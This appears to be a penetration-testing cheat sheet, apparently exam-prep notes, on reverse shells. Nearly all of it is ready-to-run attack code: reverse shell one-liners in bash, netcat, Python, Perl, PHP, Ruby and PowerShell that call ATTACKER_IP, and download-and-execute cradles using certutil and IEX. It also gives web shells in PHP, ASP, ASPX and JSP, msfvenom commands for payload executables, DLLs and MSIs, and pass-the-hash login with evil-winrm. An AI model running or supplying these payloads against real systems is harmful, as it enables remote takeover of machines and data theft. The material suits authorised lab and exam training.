---
tags: [foothold, rce, got-shell-linux, got-shell-windows, web, msfvenom, shell-upgrade, listener]
---

# Reverse Shells

> Start listener first: `nc -nvlp PORT` or `rlwrap nc -nvlp PORT` (rlwrap gives arrow key history)

---

## Listeners

```bash
nc -nvlp PORT
rlwrap nc -nvlp PORT        # better — readline support, arrow keys work

# Multi-session with metasploit (counts as your one Metasploit use)
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST tun0
set LPORT PORT
run -j
```

---

## Linux Shells

```bash
# Bash (most reliable if bash exists)
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

# Bash via /dev/tcp (alternative syntax)
exec 5<>/dev/tcp/ATTACKER_IP/PORT; cat <&5 | while read line; do $line 2>&5 >&5; done

# Netcat with -e (if compiled with it)
nc -e /bin/bash ATTACKER_IP PORT

# Netcat without -e (mkfifo)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Python2
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'

# PHP (in web shell context)
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

---

## Windows Shells

```powershell
# PowerShell one-liner
powershell -nop -w hidden -c "$client=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PowerShell encoded (avoids quote issues when injecting through web/cmdi)
# Encode on Linux:
# echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER_IP/shell.ps1")' | iconv -t utf-16le | base64 -w 0
powershell -enc <BASE64>

# cmd.exe via certutil + nc.exe
certutil -urlcache -f http://ATTACKER_IP/nc.exe C:\Windows\Temp\nc.exe
C:\Windows\Temp\nc.exe -e cmd.exe ATTACKER_IP PORT
```

### Fully interactive Windows shell (when basic shell is too limited)

```bash
# Nishang — gives a proper interactive PS shell (host the ps1, IEX it)
# On attacker: serve Invoke-PowerShellTcp.ps1 and start listener
python3 -m http.server 80
rlwrap nc -nvlp PORT

# On target (add this line to the bottom of Invoke-PowerShellTcp.ps1 before serving):
# Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port PORT
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-PowerShellTcp.ps1')
```

```bash
# Fix terminal size after catching any Windows shell
stty rows 50 cols 220

# evil-winrm is the best option when you have credentials — fully interactive
evil-winrm -i $TARGET -u Administrator -p 'Password123'
evil-winrm -i $TARGET -u Administrator -H NTLM_HASH
```

---

## Web Shells

```php
# PHP minimal
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>

# PHP with output
<?php echo "<pre>".system($_GET['cmd'])."</pre>"; ?>
```

```asp
# ASP
<%eval request("cmd")%>
```

```aspx
# ASPX
<%@ Page Language="C#" %><%System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>
```

```jsp
# JSP
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

---

## msfvenom Payloads

```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell.elf
chmod +x shell.elf

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell.exe

# Windows EXE as service binary
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe-service -o shell-svc.exe

# Windows DLL (for DLL hijacking)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f dll -o evil.dll

# Windows MSI (for AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f msi -o evil.msi

# PHP
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=PORT -f raw -o shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw -o shell.jsp

# WAR (for Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f war -o shell.war

# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f asp -o shell.asp

# ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f aspx -o shell.aspx
```

---

## Shell Upgrade (Linux — after catching raw netcat shell)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z to background
stty raw -echo; fg
# Press Enter twice if needed
export TERM=xterm
stty rows 38 cols 120   # match your terminal size: run 'stty size' locally first
```

---

## File Serving (to deliver shells)

```bash
# Python HTTP server (attacker)
python3 -m http.server 8000

# SMB share (attacker) — better for Windows targets that block HTTP
impacket-smbserver share $(pwd) -smb2support

# Windows target — download from SMB
copy \\ATTACKER_IP\share\shell.exe C:\Windows\Temp\shell.exe

# Windows target — download from HTTP
certutil -urlcache -f http://ATTACKER_IP:8000/shell.exe C:\Windows\Temp\shell.exe
iwr http://ATTACKER_IP:8000/shell.exe -o C:\Windows\Temp\shell.exe
```
